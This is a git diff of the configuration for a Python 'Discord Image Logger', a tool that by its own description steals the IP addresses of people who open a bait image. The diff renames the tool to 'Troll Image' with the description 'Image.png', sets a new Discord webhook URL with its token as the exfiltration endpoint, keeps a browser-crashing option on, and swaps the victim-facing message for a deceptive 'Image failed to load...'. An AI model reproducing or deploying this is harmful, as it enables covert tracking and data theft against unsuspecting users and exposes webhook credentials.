@@ -5,15 +5,15 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Troll Image"
+__description__ = "Image.png"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "zoshie3"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1340364569020858380/Xa0lQEY9MOUitHpOvh7F8WTuoh97N1unk0_D9Bk93cY3KSNOOTRarrVl0-ErPRZiegxH",
-    "image": "https://media1.tenor.com/m/cpbmox7BhYUAAAAd/middle-click-this-bruh.gif", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1340466390146224148/vmB16pjWQEBuUVECtWPsGILZChqMVJt6QKk-74YirxZaE33lBewDWT2dbVCeHnSM2LMJ",
+    "image": "https://i1.sndcdn.com/artworks-sr1dnWi9wSuG9znY-cyVyyg-t1080x1080.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,11 +24,11 @@ config = {
     # OPTIONS #
     "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned i now have your ip :)", # Message to show
+        "message": "Image failed to load...", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
